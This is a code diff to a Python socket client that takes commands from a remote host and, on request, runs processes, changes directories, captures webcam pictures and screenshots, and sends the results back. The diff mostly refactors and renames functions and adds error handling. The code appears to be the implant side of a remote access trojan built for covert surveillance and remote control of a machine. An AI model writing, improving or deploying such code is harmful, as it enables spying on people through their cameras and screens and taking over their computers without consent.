@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 # standard python libraries
 import time
 import subprocess
@@ -18,11 +17,10 @@ class Client:
     def __init__(self):
         self.connection = Connection()
         self.exit = False
-        manager = multiprocessing.Manager()
 
         while not self.exit:
             request = self.dec_request(self.connection.recv(self.connection.sock))
-            self.response = manager.dict()
+            self.response = multiprocessing.Manager().dict()
             self.response["data"] = ""
             self.response["error"] = ""
 
@@ -39,11 +37,11 @@ class Client:
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.enc_response(self.response), self.connection.sock)
             elif request["cmd"] == "w":
-                process = multiprocessing.Process(target=self.zip_file_or_folder, args=(self.response, request["cam_port"], request["save_path"],))
+                process = multiprocessing.Process(target=self.capture_camera_picture, args=(self.response, request["cam_port"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.enc_response(self.response), self.connection.sock)
             elif request["cmd"] == "s":
-                process = multiprocessing.Process(target=self.make_screenshot, args=(self.response, request["monitor"], request["save_path"],))
+                process = multiprocessing.Process(target=self.capture_screenshot, args=(self.response, request["monitor"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.enc_response(self.response), self.connection.sock)
             elif request["cmd"] == "d":
@@ -58,7 +56,6 @@ class Client:
     def cwd(self, response, mode, path):
         if mode == "set":
             try:
-                print(path)
                 os.chdir(path)
             except FileNotFoundError:
                 response["error"] = "FileNotFoundError"
@@ -99,7 +96,7 @@ class Client:
             response["error"] = "PermissionError"
         self.connection.send(self.enc_response(response), self.connection.sock)
 
-    def make_screenshot(self, response, monitor, path):
+    def capture_screenshot(self, response, monitor, path):
         try:
             with mss.mss() as sct:
                 sct.shot(mon=int(monitor), output=path)
@@ -135,9 +132,9 @@ class Client:
         if not success:
             response["error"] = "UnableToCapturePicture"
         video_capture.release()
-        cv2.destroyAllWindows()
-        cv2.imwrite(path_to_save, frame)
-        # TODO error handeling
+        success = cv2.imwrite(path_to_save, frame)
+        if not success:
+            response["error"] = "UnableToSavePicture"
 
     def handle_process(self, process, timeout):
         process.start()
@@ -167,8 +164,9 @@ class Connection:
             try:
                 HOST = str(sys.argv[1])
                 PORT = int(sys.argv[2])
-            except ValueError:
-                print("[-] InvalidCommandlineArguments")
+            except ValueError:  # InvalidCommandlineArguments
+                HOST = "127.0.0.1"
+                PORT = 10001
 
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -192,9 +190,10 @@ class Connection:
 
 if __name__ == "__main__":
     while True:
-        try:
-            client = Client()
-            if client.exit:
-                break
-        except:
-            pass
+        #try:
+        client = Client()
+        time.sleep(10000000)
+            #if client.exit:
+                #break
+        #except:
+            #pass
